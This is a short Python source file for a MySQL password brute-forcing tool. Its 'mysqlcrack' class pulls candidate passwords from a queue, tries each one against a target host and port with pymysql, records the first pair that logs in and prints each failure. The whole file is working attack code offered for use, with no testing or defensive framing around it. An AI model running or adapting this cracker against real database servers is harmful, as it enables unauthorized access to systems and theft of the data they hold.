
import time
import pymysql
import re

class mysqlcrack:
    def __init__(self,args):
        self.args=args


    def run(self,passwd_list,result,username):
        while True:
            try:
                passwd=passwd_list.get(timeout=1)
            except:
                result.put(1)
                time.sleep(0.5)
                exit(1)


            try:
                pymysql.connect(self.args[1], username,passwd, port=int(self.args[2]))
                result.put((username,passwd))
                time.sleep(0.5)
                exit(1)
            except Exception as e:
                print("ERROT----- (Username:%s  Passwd:%s)" %(username,passwd))


            finally:
                pass
